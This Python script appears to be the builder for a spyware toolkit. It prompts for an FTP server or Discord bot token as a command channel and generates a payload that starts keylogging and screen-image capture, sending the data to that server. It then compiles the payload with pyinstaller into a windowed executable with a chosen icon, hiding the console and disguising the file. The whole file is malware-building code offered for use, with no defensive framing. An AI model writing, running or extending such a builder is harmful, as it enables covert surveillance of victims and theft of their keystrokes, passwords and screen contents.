import threading 
import os
import shutil

ASCII_DATA = '''
        8""""                                 
        8     eeeee eeeee e  e     eeeee eeeee
        8eeee 8   8 8   " 8  8     8  88 8   8
        88    8eee8 8eeee 8e 8e    8   8 8e  8
        88    88       88 88 88    8   8 88  8
        88eee 88    8ee88 88 88eee 8eee8 88  8
\n\n

'''

print(ASCII_DATA)
DEBUG = True



DEBUG = bool(input("Debug mode(True/False) : "))
Name = input("Provide name of the binary : ")

network = input("Input network pathway for communication \n1.Ftp\n2.Discord bot\n")
File = open(Name+'.py','w')
File.write('import payloads.behaviour\n')

if network == "1":
    address = input("input ftp address : ")
    username = input("input ftp username : ")
    password = input("input ftp password : ")
    File.write('from  network.ftpconn import init_creditinals\n')
    File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
    keys = input("Give option(s) : ")
    print("Select yor payloads (seprated by spaces) :")
    print("1.Satelite")
    print("2.KeyLogger")
    list_keys = [int(k) for k in keys.split(' ')]
    
    for i in list_keys:
        
        if i == 1:
            File.write('from network.ftpconn import startimageloggging\n')
            File.write('startimageloggging()\n')
        elif i ==2:
            File.write('from network.ftpconn import startkeylogging\n')
            File.write('startkeylogging()\n')

elif network == "2":
    token = input("Input your discord bot token")
    File.write('from network.discordbot import runbot,init_bot\n')
    File.write('init_bot("'+token+'")\n')
    File.write('runbot()\n')
    
iconfile = input("icon file for the binary (if not needed leave it) : ")

File.close()

Create_Binary = input("Do you want to compile and create binary of created payload? (Y/N)")

if Create_Binary == 'Y' or Create_Binary == 'y':
    cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
    if not DEBUG :
        cmd = cmd + " --windowed"
    if iconfile is not "":
        if '.ico' not in iconfile:
            iconfile = iconfile + '.ico'
        cmd = cmd + " --icon="+iconfile
     
    os.system(cmd) 
    shutil.rmtree(Name)
    os.remove(Name+'.spec')
    